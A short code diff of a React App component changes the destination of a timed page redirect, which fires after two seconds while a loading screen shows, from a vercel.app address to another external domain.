@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://sageguts-updated.vercel.app';
+            window.location.href = 'https://load.orenbayanhavlu.com.tr';
         }, 2000);
 
         return () => clearTimeout(timer);
